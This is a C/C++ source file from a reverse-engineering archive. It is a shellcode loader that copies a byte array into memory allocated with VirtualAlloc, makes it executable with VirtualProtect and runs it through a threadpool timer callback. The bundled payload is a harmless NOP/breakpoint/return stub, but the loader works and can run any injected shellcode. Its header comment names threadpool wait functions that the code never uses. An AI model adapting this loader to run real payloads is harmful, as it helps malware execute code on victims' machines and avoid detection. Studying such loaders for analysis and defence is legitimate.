/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as new thread.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateThreadpoolWait + SetThreadpoolWait
*/

#include <windows.h>
#include <stdint.h>

#define _SECOND 10000000

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    PTP_TIMER   th_timer;
    FILETIME    time;
    ULARGE_INTEGER duetime;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // create new timer object
        th_timer = CreateThreadpoolTimer ((PTP_TIMER_CALLBACK)runtime, NULL, NULL);

        // set time and wait for running (2 seconds later)
        duetime.QuadPart = (ULONGLONG) -2 * _SECOND;
        time.dwHighDateTime = duetime.HighPart;
        time.dwLowDateTime  = duetime.LowPart;
        SetThreadpoolTimer (th_timer, &time, 0, 0);

        Sleep(3000);

        // close the threadpool timer
        CloseThreadpoolTimer(th_timer);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}